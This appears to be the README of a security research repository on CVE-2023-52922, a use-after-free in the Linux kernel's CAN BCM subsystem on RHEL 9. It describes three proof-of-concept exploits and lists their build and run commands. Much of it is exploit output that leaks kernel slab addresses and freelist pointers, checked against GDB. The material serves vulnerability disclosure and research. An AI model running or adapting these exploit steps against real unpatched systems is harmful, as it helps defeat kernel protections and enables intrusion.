<div align="justify">
<h1>Use-after-free vulnerability in the CAN BCM subsystem leading to information disclosure (CVE-2023-52922)</h1>

We identified a nday vulnerability affecting Red Hat Enterprise Linux 9 and its derivatives. The vulnerability is a use-after-free read that leads to information disclosure. An attacker abusing the vulnerability could defeat security mechanisms present in the Linux kernel. All the details about the vulnerability and how we abused it can be found in our blog post [\[1\]](#1---use-after-free-vulnerability-in-the-can-bcm-subsystem-leading-to-information-disclosure-cve-2023-52922). The vulnerability was fixed in the Linux kernel upstream on July 17, 2023 [\[2\]](#2---can-bcm-fix-uaf-in-bcm_proc_show)[\[3\]](#3---can-bcm-fix-uaf-in-bcm_proc_show). We reported the vulnerability to Red Hat on July 16, 2024, and they fixed it on March 11, 2025 [\[4\]](#4---red-hat-security-advisory-rhsa-20252627)[\[5\]](#5---red-hat-portal-customer-cve-2023-52922), kernel version 5.14.0-503.31.1.el9_5.

This repository contains the materials developed for this research.

It includes:

1 - Three proofs of concept:\
&nbsp;&nbsp;&nbsp;&nbsp;1.1 - codes/method01/exploit.c - Reclaims the freed object and controls offset 0, dereferencing an arbitrary address.\
&nbsp;&nbsp;&nbsp;&nbsp;1.2 - codes/method02/exploit.c - Reclaims the freed object with a System V message object.\
&nbsp;&nbsp;&nbsp;&nbsp;1.3 - codes/method03/exploit.c - Leaks encoded freelist null pointer and objects' addresses from a slab.\
2 - Vulnerable kernel packages:\
&nbsp;&nbsp;&nbsp;&nbsp;2.1 - packages/kernel-5.14.0-503.29.1.el9_5.x86_64.rpm\
&nbsp;&nbsp;&nbsp;&nbsp;2.2 - packages/kernel-core-5.14.0-503.29.1.el9_5.x86_64.rpm\
&nbsp;&nbsp;&nbsp;&nbsp;2.3 - packages/kernel-modules-5.14.0-503.29.1.el9_5.x86_64.rpm\
&nbsp;&nbsp;&nbsp;&nbsp;2.4 - packages/kernel-modules-core-5.14.0-503.29.1.el9_5.x86_64.rpm\
3 - GDBinit script\
&nbsp;&nbsp;&nbsp;&nbsp;3.1 - tools/gdbinit - GDB initialization file (.gdbinit) that implements the GDB commands slabcaches, printkmemcachecpu, and freelistwalk.\
4 - Data\
&nbsp;&nbsp;&nbsp;&nbsp;4.1 - files/run* - Outputs collected from 10 executions of proof of concept 1.3.

While working on this research, we discovered two new vulnerabilities in the CAN BCM subsystem. These vulnerabilities are identified by CVE-2025-38003 [\[6\]](#6---cve-2025-38003-can-bcm-add-missing-rcu-read-protection-for-procfs-content)[\[7\]](#7---can-bcm-add-missing-rcu-read-protection-for-procfs-content) and CVE-2025-38004 [\[8\]](#8---cve-2025-38004-can-bcm-add-locking-for-bcm_op-runtime-updates)[\[9\]](#9---can-bcm-add-locking-for-bcm_op-runtime-updates). A blog post about these vulnerabilities and the materials related to that research will be published soon.

Demonstration:

Even though we released three proofs of concept, only 1.3 demonstrates an interesting attack. Executing the proof of concept 1.3 available in this repository, the result is as follows.

```
$ cd codes/method03/
$ make
$ unshare -Urn
# ip link add type vxcan
# ./exploit

Leaked encoded freelist null pointer: 0xacbd5e2efdd98930

slab[0] =	0xffff88800a6d6000
slab[1] =	0xffff88800a6d6200
slab[2] =	0xffff88800a6d6400
slab[3] =	0xffff88800a6d6600
slab[4] =	0xffff88800a6d6800
slab[5] =	0xffff88800a6d6a00
slab[6] =	0xffff88800a6d6c00
slab[7] =	0xffff88800a6d6e00
slab[8] =	0xffff88800a6d7000
slab[9] =	0xffff88800a6d7200
slab[10] =	0xffff88800a6d7400
slab[11] =	0xffff88800a6d7600
slab[12] =	0xffff88800a6d7800
slab[13] =	0xffff88800a6d7a00
slab[14] =	0xffff88800a6d7c00
slab[15] =	0xffff88800a6d7e00

#
```

On a debugger connected to the virtual machine, we validate whether the result printed out by the proof of concept is valid. The proof of concept prints out the encoded freelist null pointer and the objects' addresses from the slab currently on the CPU. The addresses in the slab are shuffled due to `SLAB_FREELIST_RANDOM` security mechanism in the Linux kernel. That's why they are not printed in the same order as found in the CPU cache. For this validation to happen successfully, the GDB commands need to be executed right after the proof of concept finishes. Otherwise, other processes might allocate or free objects from/to the cache and the result seen on the debugger might be different than expected. The GDB commands executed below are available in the initialization file located at `tools/gdbinit`. More information about GDB initialization files can be found at the links referred by [\[10\]](#10---gdb-documentation---214-initialization-files)[\[11\]](#11---gdbinit---gdb-initialization-scripts). Knowledge about the Linux kernel SLUB allocator is also needed. You can find a thorough presentation about it on [\[12\]](#12---slub-internals-for-exploit-developers).

```
(gdb) slabcaches "kmalloc-512"
Object:         0xffff888004441a00
Name:           kmalloc-512
Size:           512
Object size:    512
Offset:         256
Refcount:       -1
Ctor:           (nil)
Inuse:          512
Align:          512
Random:         0xed00d622dd756e02
CPU slab:       0x39140
CPU partial:    52
Flags:          0x40001000
Min partial:    5
Alloc flags:    0x40000
List:           0xffff888004441a68
Node:           0xffff888004441ad8
(gdb) printkmemcachecpu 0 0x39140
Object:         0xffff88806f039140
Freelist:       0xffff88800a6d6200
TID:            1260601344
Slab:           0xffffea000029b580
Partial:        0xffffea00001e0100
(gdb) freelistwalk 0xffff88800a6d6200 256 0xacd433247d5177a4
Freelist pointer: 0xffff88800a6d6200
Freelist pointer: 0xffff88800a6d7800
Freelist pointer: 0xffff88800a6d6600
Freelist pointer: 0xffff88800a6d6400
Freelist pointer: 0xffff88800a6d6000
Freelist pointer: 0xffff88800a6d7200
Freelist pointer: 0xffff88800a6d7a00
Freelist pointer: 0xffff88800a6d6a00
Freelist pointer: 0xffff88800a6d7000
Freelist pointer: 0xffff88800a6d6e00
Freelist pointer: 0xffff88800a6d7c00
Freelist pointer: 0xffff88800a6d7400
Freelist pointer: 0xffff88800a6d6c00
Freelist pointer: 0xffff88800a6d7e00
Freelist pointer: 0xffff88800a6d7600
Freelist pointer: 0xffff88800a6d6800
Freelist count: 16
(gdb) 
```

Extracting the addresses from the proof of concept's output and the GDB commands above, and ordering them, we can confirm that the addresses printed out by the proof of concept are the same as the slab currently in use on the CPU of the `kmalloc-512` cache. This demonstrates that the proof of concept obtained the proper addresses.

```
$ cat exploit_output.txt

Leaked encoded freelist null pointer: 0xacbd5e2efdd98930

slab[0] =   0xffff88800a6d6000
slab[1] =   0xffff88800a6d6200
slab[2] =   0xffff88800a6d6400
slab[3] =   0xffff88800a6d6600
slab[4] =   0xffff88800a6d6800
slab[5] =   0xffff88800a6d6a00
slab[6] =   0xffff88800a6d6c00
slab[7] =   0xffff88800a6d6e00
slab[8] =   0xffff88800a6d7000
slab[9] =   0xffff88800a6d7200
slab[10] =  0xffff88800a6d7400
slab[11] =  0xffff88800a6d7600
slab[12] =  0xffff88800a6d7800
slab[13] =  0xffff88800a6d7a00
slab[14] =  0xffff88800a6d7c00
slab[15] =  0xffff88800a6d7e00

$ cat exploit_output.txt | grep slab | awk '{print $3}' | sort -b > exploit_output_filtered_sorted.txt
$ cat debugger_output.txt
(gdb) slabcaches "kmalloc-512"
Object:         0xffff888004441a00
Name:           kmalloc-512
Size:           512
Object size:    512
Offset:         256
Refcount:       -1
Ctor:           (nil)
Inuse:          512
Align:          512
Random:         0xed00d622dd756e02
CPU slab:       0x39140
CPU partial:    52
Flags:          0x40001000
Min partial:    5
Alloc flags:    0x40000
List:           0xffff888004441a68
Node:           0xffff888004441ad8
(gdb) printkmemcachecpu 0 0x39140
Object:         0xffff88806f039140
Freelist:       0xffff88800a6d6200
TID:            1260601344
Slab:           0xffffea000029b580
Partial:        0xffffea00001e0100
(gdb) freelistwalk 0xffff88800a6d6200 256 0xacd433247d5177a4
Freelist pointer: 0xffff88800a6d6200
Freelist pointer: 0xffff88800a6d7800
Freelist pointer: 0xffff88800a6d6600
Freelist pointer: 0xffff88800a6d6400
Freelist pointer: 0xffff88800a6d6000
Freelist pointer: 0xffff88800a6d7200
Freelist pointer: 0xffff88800a6d7a00
Freelist pointer: 0xffff88800a6d6a00
Freelist pointer: 0xffff88800a6d7000
Freelist pointer: 0xffff88800a6d6e00
Freelist pointer: 0xffff88800a6d7c00
Freelist pointer: 0xffff88800a6d7400
Freelist pointer: 0xffff88800a6d6c00
Freelist pointer: 0xffff88800a6d7e00
Freelist pointer: 0xffff88800a6d7600
Freelist pointer: 0xffff88800a6d6800
Freelist count: 16
(gdb)
$ cat debugger_output.txt | grep "Freelist pointer" | awk '{print $3}' | sort -b > debugger_output_filtered_sorted.txt 
$ md5sum debugger_output_filtered_sorted.txt exploit_output_filtered_sorted.txt 
5380d41e3c514335a06f86e7dd30f396  debugger_output_filtered_sorted.txt
5380d41e3c514335a06f86e7dd30f396  exploit_output_filtered_sorted.txt
$
```

The proof of concept is reliable, and we did not observe any side effects during our experiments. To test the proof of concept, run them in a vulnerable kernel. There are some runtime parameters that the proof of concept depends on and they might change depending on the system configuration. It has been tested on a virtual machine running Alma Linux 9 on VMware Workstation with 4 and 8 CPUs and 2 GB of RAM. As an example, the number of objects in the `kmalloc-512` cache changes from 16 to 32 in a system with 4 to 8 CPUs. The proof of concept configuration `CACHE_OBJECTS` needs to have the exact number of objects of the target cache (`kmalloc-512`).

```
$ cat exploit.c | grep "define CACHE_OBJECTS"
#define CACHE_OBJECTS 16
$ 
```

System with 4 CPUs:

```
$ sudo ./slabinfo -r "^kmalloc-512$"

Slabcache: kmalloc-512      Aliases:  0 Order :  1 Objects: 1364

Sizes (bytes)     Slabs              Debug                Memory
------------------------------------------------------------------------
Object :     512  Total  :      91   Sanity Checks : Off  Total:  745472
SlabObj:     512  Full   :      49   Redzoning     : Off  Used :  698368
SlabSiz:    8192  Partial:      22   Poisoning     : Off  Loss :   47104
Loss   :       0  CpuSlab:      20   Tracking      : Off  Lalig:       0
Align  :     512  Objects:      16   Tracing       : Off  Lpadd:       0

kmalloc-512 has no kmem_cache operations

kmalloc-512: Kernel object allocation
-----------------------------------------------------------------------
No Data

kmalloc-512: Kernel object freeing
------------------------------------------------------------------------
No Data

kmalloc-512: No NUMA information available.
$
```

System with 8 CPUs:

```
$ sudo ./slabinfo -r "^kmalloc-512$"

Slabcache: kmalloc-512      Aliases:  0 Order :  2 Objects: 1788

Sizes (bytes)     Slabs              Debug                Memory
------------------------------------------------------------------------
Object :     512  Total  :      63   Sanity Checks : Off  Total: 1032192
SlabObj:     512  Full   :      19   Redzoning     : Off  Used :  915456
SlabSiz:   16384  Partial:      15   Poisoning     : Off  Loss :  116736
Loss   :       0  CpuSlab:      29   Tracking      : Off  Lalig:       0
Align  :     512  Objects:      32   Tracing       : Off  Lpadd:       0

kmalloc-512 has no kmem_cache operations

kmalloc-512: Kernel object allocation
-----------------------------------------------------------------------
No Data

kmalloc-512: Kernel object freeing
------------------------------------------------------------------------
No Data

kmalloc-512: No NUMA information available.
$ 
```

The tool `slabinfo` is available in the Linux kernel source code located at `tools/mm/slabinfo.c`.

The proof of concept supports three verbosity levels, available through the commands: `make verbose`, `make verbose2` and `make debug`. 

```
# make
# ./exploit

Leaked freelist encoded null pointer: 0x424dae685538b1d8


slab[0] =	0xffff888006d5e000
slab[1] =	0xffff888006d5e200
slab[2] =	0xffff888006d5e400
slab[3] =	0xffff888006d5e600
slab[4] =	0xffff888006d5e800
slab[5] =	0xffff888006d5ea00
slab[6] =	0xffff888006d5ec00
slab[7] =	0xffff888006d5ee00
slab[8] =	0xffff888006d5f000
slab[9] =	0xffff888006d5f200
slab[10] =	0xffff888006d5f400
slab[11] =	0xffff888006d5f600
slab[12] =	0xffff888006d5f800
slab[13] =	0xffff888006d5fa00
slab[14] =	0xffff888006d5fc00
slab[15] =	0xffff888006d5fe00

#
```

```
# make verbose
# ./exploit
[*] - Disabling stdout buffering
[*] - Checking number of CPUs available
[*] - CPUs available: 4
[*] - Setting up CPU affinity spare thread CPU 3
[*] - Socket created successfully
[*] - Socket connected successfully
[*] - CAN BCM entry: 26113
[*] - Setting up CPU affinity main thread CPU 2
[*] - Preparing the cache
[*] - Allocating 1600 objects
[*] - Freeing 16 objects
[*] - Allocating target object
[*] - Setting up CPU affinity spare thread CPU 3
[*] - Freeing remaining objects
[*] - Creating close thread
[*] - Creating read threads
[*] - The race starts, releasing race barriers
[*] - Waiting...
[*] - Finishing read threads
[*] - 16 objects obtained
[*] - Validating the first entry
[*] - First entry validated
[*] - Validating the other 15 objects
[*] - All objects validated

Leaked freelist encoded null pointer: 0x42176b695538ae68


slab[0] =	0xffff88800710b000
slab[1] =	0xffff88800710b200
slab[2] =	0xffff88800710b400
slab[3] =	0xffff88800710b600
slab[4] =	0xffff88800710b800
slab[5] =	0xffff88800710ba00
slab[6] =	0xffff88800710bc00
slab[7] =	0xffff88800710be00
slab[8] =	0xffff88800710c000
slab[9] =	0xffff88800710c200
slab[10] =	0xffff88800710c400
slab[11] =	0xffff88800710c600
slab[12] =	0xffff88800710c800
slab[13] =	0xffff88800710ca00
slab[14] =	0xffff88800710cc00
slab[15] =	0xffff88800710ce00

[*] - Finishing close thread
[*] - Exiting...
#
```

```
# make verbose2
# ./exploit
[*] - Disabling stdout buffering
[*] - Checking number of CPUs available
[*] - CPUs available: 4
[*] - Setting up CPU affinity spare thread CPU 3
[*] - Socket created successfully
[*] - Socket connected successfully
[*] - CAN BCM entry: 26120
[*] - Setting up CPU affinity main thread CPU 2
[*] - Preparing the cache
[*] - Allocating 1600 objects
[*] - Freeing 16 objects
[*] - Allocating target object
[*] - Setting up CPU affinity spare thread CPU 3
[*] - Freeing remaining objects
[*] - Creating close thread
[*] - Creating read threads
[*] - The race starts, releasing race barriers
[*] - Setting up CPU affinity race02 (read) thread to CPU 2
[*] - Setting up CPU affinity race01 (close) thread to CPU 2
[*] - Closing socket (race01)
[*] - Waiting...
[*] - Finishing read threads
[*] - Reading /proc/net/can-bcm/entry (race02)
[*] - 16 objects obtained
[*] - Validating the first entry
[*] - First entry validated
[*] - Validating the other 15 objects
[*] - All objects validated

Leaked freelist encoded null pointer: 0x42c9f8645538af90


slab[0] =	0xffff88800a836000
slab[1] =	0xffff88800a836200
slab[2] =	0xffff88800a836400
slab[3] =	0xffff88800a836600
slab[4] =	0xffff88800a836800
slab[5] =	0xffff88800a836a00
slab[6] =	0xffff88800a836c00
slab[7] =	0xffff88800a836e00
slab[8] =	0xffff88800a837000
slab[9] =	0xffff88800a837200
slab[10] =	0xffff88800a837400
slab[11] =	0xffff88800a837600
slab[12] =	0xffff88800a837800
slab[13] =	0xffff88800a837a00
slab[14] =	0xffff88800a837c00
slab[15] =	0xffff88800a837e00

[*] - Finishing close thread
[*] - Exiting...
#
```

```
# make debug
# ./exploit
[*] - Disabling stdout buffering
[*] - Checking number of CPUs available
[*] - CPUs available: 4
[*] - Setting up CPU affinity spare thread CPU 3
[*] - Socket created successfully
[*] - Socket connected successfully
[*] - CAN BCM entry: 26127
[*] - Setting up CPU affinity main thread CPU 2
[*] - Preparing the cache
[*] - Allocating 1600 objects
[*] - Freeing 16 objects
[*] - Allocating target object
[*] - Setting up CPU affinity spare thread CPU 3
[*] - Freeing remaining objects
[*] - Creating close thread
[*] - Creating read threads
[*] - The race starts, releasing race barriers
[*] - Setting up CPU affinity race02 (read) thread to CPU 2
[*] - Setting up CPU affinity race01 (close) thread to CPU 2
[*] - Closing socket (race01)
[*] - Waiting...
[*] - Finishing read threads
[*] - Reading /proc/net/can-bcm/entry (race02)
[*] - Content: 

>>> socket 0000000000000000 / sk 0000000000000000 / bo 0000000000000000 / dropped 0 / bound vxcan1 <<<
tx_op: 63F vxcan1 [1] t2=4780907894528324 # sent 0
tx_op: 63E vxcan1 [1] t2=-4781491405787671 # sent 0
tx_op: 63D vxcan1 [1] t2=-4782617305694514 # sent 0
tx_op: 63C vxcan1 [1] t2=-4779802555927407 # sent 0
tx_op: 63B vxcan1 [1] t2=-4778113706067140 # sent 0
tx_op: 63A vxcan1 [1] t2=-4775861906253462 # sent 0
tx_op: 639 vxcan1 [1] t2=-4778676656020566 # sent 0
tx_op: 638 vxcan1 [1] t2=-4774736006346613 # sent 0
tx_op: 637 vxcan1 [1] t2=-4776987806160303 # sent 0
tx_op: 636 vxcan1 [1] t2=-4779239605973990 # sent 0
tx_op: 635 vxcan1 [1] t2=-4776424856206878 # sent 0
tx_op: 634 vxcan1 [1] t2=-4782054355741096 # sent 0
tx_op: 633 vxcan1 [1] t2=-4777550756113721 # sent 0
tx_op: 632 vxcan1 [1] t2=-4780365505880832 # sent 0
tx_op: 631 vxcan1 [1] t2=-4775298956300034 # sent 0
tx_op: 630 vxcan1 [1] t2=-4774173056393195 # sent 0

[*] - 16 objects obtained
[*] - Validating the first entry
[*] - First entry validated
[*] - Validating the other 15 objects
[*] - All objects validated

Leaked freelist 0: 0x10fc35dcc1d944	| Leaked freelist decoded: 0x425932665538b1a0
Leaked freelist 1: 0xffef03424742ede9	| Leaked freelist decoded: 0xbda4bae65d715628
Leaked freelist 2: 0xffef023c2265bece	| Leaked freelist decoded: 0xbda0bae65d7154b0
Leaked freelist 3: 0xffef04cb7e8eb491	| Leaked freelist decoded: 0xbdaabae65d715668
Leaked freelist 4: 0xffef0654b5da7b3c	| Leaked freelist decoded: 0xbdb0bae65d716260
Leaked freelist 5: 0xffef0860ff94d96a	| Leaked freelist decoded: 0xbdb8bae65d714610
Leaked freelist 6: 0xffef05d1a36be3aa	| Leaked freelist decoded: 0xbdaebae65d715010
Leaked freelist 7: 0xffef09672472088b	| Leaked freelist decoded: 0xbdbcbae65d715ef8
Leaked freelist 8: 0xffef075adab7aa51	| Leaked freelist decoded: 0xbdb4bae65d714c68
Leaked freelist 9: 0xffef054e90fd4c1a	| Leaked freelist decoded: 0xbdacbae65d714590
Leaked freelist 10: 0xffef07dded2641e2	| Leaked freelist decoded: 0xbdb6bae65d715ad0
Leaked freelist 11: 0xffef02bf34d45658	| Leaked freelist decoded: 0xbda2bae65d7147c0
Leaked freelist 12: 0xffef06d7c84912c7	| Leaked freelist decoded: 0xbdb2bae65d715958
Leaked freelist 13: 0xffef04486c201d00	| Leaked freelist decoded: 0xbda8bae65d714800
Leaked freelist 14: 0xffef08e4120370fe	| Leaked freelist decoded: 0xbdbabae65d716030
Leaked freelist 15: 0xffef09ea36e0a015	| Leaked freelist decoded: 0xbdbebae65d715208

Leaked freelist encoded null pointer: 0x425932665538b1a0

Leaked slab address: 0xfffd88800849e788
Leaked slab address: 0xfff988800849e510
Leaked slab address: 0xfff388800849e7c8
Leaked slab address: 0xffe988800849d3c0
Leaked slab address: 0xffe188800849f7b0
Leaked slab address: 0xfff788800849e1b0
Leaked slab address: 0xffe588800849ef58
Leaked slab address: 0xffed88800849fdc8
Leaked slab address: 0xfff588800849f430
Leaked slab address: 0xffef88800849eb70
Leaked slab address: 0xfffb88800849f660
Leaked slab address: 0xffeb88800849e8f8
Leaked slab address: 0xfff188800849f9a0
Leaked slab address: 0xffe388800849d190
Leaked slab address: 0xffe788800849e3a8

Leaked slab: 0xffff88800849e000
Leaked slab: 0xffff88800849e000
Leaked slab: 0xffff88800849e000
Leaked slab: 0xffff88800849d000
Leaked slab: 0xffff88800849f000
Leaked slab: 0xffff88800849e000
Leaked slab: 0xffff88800849e000
Leaked slab: 0xffff88800849f000
Leaked slab: 0xffff88800849f000
Leaked slab: 0xffff88800849e000
Leaked slab: 0xffff88800849f000
Leaked slab: 0xffff88800849e000
Leaked slab: 0xffff88800849f000
Leaked slab: 0xffff88800849d000
Leaked slab: 0xffff88800849e000

slab_counts[0].address: 0xffff88800849e000 | count: 8
slab_counts[1].address: 0xffff88800849d000 | count: 2
slab_counts[2].address: 0xffff88800849f000 | count: 5
slab_counts[3].address: 0x0 | count: 0
slab_counts[4].address: 0x0 | count: 0
slab_counts[5].address: 0x0 | count: 0
slab_counts[6].address: 0x0 | count: 0
slab_counts[7].address: 0x0 | count: 0
slab_counts[8].address: 0x0 | count: 0
slab_counts[9].address: 0x0 | count: 0
slab_counts[10].address: 0x0 | count: 0
slab_counts[11].address: 0x0 | count: 0
slab_counts[12].address: 0x0 | count: 0
slab_counts[13].address: 0x0 | count: 0
slab_counts[14].address: 0x0 | count: 0

slab[0] =	0xffff88800849e000
slab[1] =	0xffff88800849e200
slab[2] =	0xffff88800849e400
slab[3] =	0xffff88800849e600
slab[4] =	0xffff88800849e800
slab[5] =	0xffff88800849ea00
slab[6] =	0xffff88800849ec00
slab[7] =	0xffff88800849ee00
slab[8] =	0xffff88800849f000
slab[9] =	0xffff88800849f200
slab[10] =	0xffff88800849f400
slab[11] =	0xffff88800849f600
slab[12] =	0xffff88800849f800
slab[13] =	0xffff88800849fa00
slab[14] =	0xffff88800849fc00
slab[15] =	0xffff88800849fe00

[*] - Finishing close thread
[*] - Exiting...
#
```

The files present in the `files/` directory contain the outputs of 10 executions of the proof of concept and the debugger commands. They confirm the exploit could successfully discover the slab virtual base address correctly.

```
$ find files/ -name "*filtered_sorted.txt" -type f -exec md5sum {} \;
adc4cc0ddf8aae10287557452fd76d77  files/run1/exploit_output_filtered_sorted.txt
adc4cc0ddf8aae10287557452fd76d77  files/run1/debugger_output_filtered_sorted.txt
15127c27cbabdb0be8cec6590e0111f4  files/run2/exploit_output_filtered_sorted.txt
15127c27cbabdb0be8cec6590e0111f4  files/run2/debugger_output_filtered_sorted.txt
82b68d64804eabec1b9186dba6a192c9  files/run3/debugger_output_filtered_sorted.txt
82b68d64804eabec1b9186dba6a192c9  files/run3/exploit_output_filtered_sorted.txt
03307abbdbc115f1ea524465066ef092  files/run4/debugger_output_filtered_sorted.txt
03307abbdbc115f1ea524465066ef092  files/run4/exploit_output_filtered_sorted.txt
db0e8cb867684a743ca8407fdf095ec2  files/run5/debugger_output_filtered_sorted.txt
db0e8cb867684a743ca8407fdf095ec2  files/run5/exploit_output_filtered_sorted.txt
47700f49fc6e0696e22ef6d665d206a5  files/run6/debugger_output_filtered_sorted.txt
47700f49fc6e0696e22ef6d665d206a5  files/run6/exploit_output_filtered_sorted.txt
372637bca27e87124b469cb4435acdd2  files/run7/debugger_output_filtered_sorted.txt
372637bca27e87124b469cb4435acdd2  files/run7/exploit_output_filtered_sorted.txt
c5d1a07a9b64165152f3afe26da0a202  files/run8/debugger_output_filtered_sorted.txt
c5d1a07a9b64165152f3afe26da0a202  files/run8/exploit_output_filtered_sorted.txt
be77e50459777e23056b3f55e0bcc528  files/run9/exploit_output_filtered_sorted.txt
be77e50459777e23056b3f55e0bcc528  files/run9/debugger_output_filtered_sorted.txt
aa8d997079b095d079b6f5a2813d28b1  files/run10/debugger_output_filtered_sorted.txt
aa8d997079b095d079b6f5a2813d28b1  files/run10/exploit_output_filtered_sorted.txt
$
```

If you need the kernel binary and its source code, they are located at [\[13\]](#13---kernel-5140-503291el9_5srcrpm)[\[14\]](#14---kernel-debuginfo-5140-503291el9_5x86_64rpm).

If you have any questions or suggestions, send us an email at info [at] allelesecurity.com.

# References

#### [1] - Use-after-free vulnerability in the CAN BCM subsystem leading to information disclosure (CVE-2023-52922)
https://allelesecurity.com/use-after-free-vulnerability-in-can-bcm-subsystem-leading-to-information-disclosure-cve-2023-52922/

#### [2] - can: bcm: Fix UAF in bcm_proc_show()
https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=55c3b96074f3f9b0aee19bf93cd71af7516582bb

#### [3] - can: bcm: Fix UAF in bcm_proc_show()
https://github.com/torvalds/linux/commit/55c3b96074f3f9b0aee19bf93cd71af7516582bb

#### [4] - Red Hat Security Advisory RHSA-2025:2627
https://access.redhat.com/errata/RHSA-2025:2627

#### [5] - Red Hat Portal Customer: CVE-2023-52922
https://access.redhat.com/security/cve/cve-2023-52922

#### [6] - CVE-2025-38003: can: bcm: add missing rcu read protection for procfs content
https://lore.kernel.org/linux-cve-announce/2025060859-CVE-2025-38003-6565@gregkh/T/#u

#### [7] - can: bcm: add missing rcu read protection for procfs content
https://github.com/torvalds/linux/commit/dac5e6249159ac255dad9781793dbe5908ac9ddb

#### [8] - CVE-2025-38004: can: bcm: add locking for bcm_op runtime updates
https://lore.kernel.org/linux-cve-announce/2025060801-CVE-2025-38004-30d2@gregkh/T/#u

#### [9] - can: bcm: add locking for bcm_op runtime updates
https://github.com/torvalds/linux/commit/c2aba69d0c36a496ab4f2e81e9c2b271f2693fd7

#### [10] - GDB Documentation - 2.1.4 Initialization Files
https://sourceware.org/gdb/current/onlinedocs/gdb.html/Initialization-Files.html

#### [11] - gdbinit - GDB initialization scripts
https://man7.org/linux/man-pages/man5/gdbinit.5.html

#### [12] - SLUB Internals for Exploit Developers
https://docs.google.com/presentation/d/1_7qL1G-YkNYdOB0mXupAs5Soq4Qnd4lNptjiFl9P3Nw/edit

#### [13] - kernel-5.14.0-503.29.1.el9_5.src.rpm
https://vault.almalinux.org/9.5/BaseOS/Source/Packages/kernel-5.14.0-503.29.1.el9_5.src.rpm

#### [14] - kernel-debuginfo-5.14.0-503.29.1.el9_5.x86_64.rpm
https://vault.almalinux.org/9.5/BaseOS/debug/x86_64/Packages/kernel-debuginfo-5.14.0-503.29.1.el9_5.x86_64.rpm
</div>
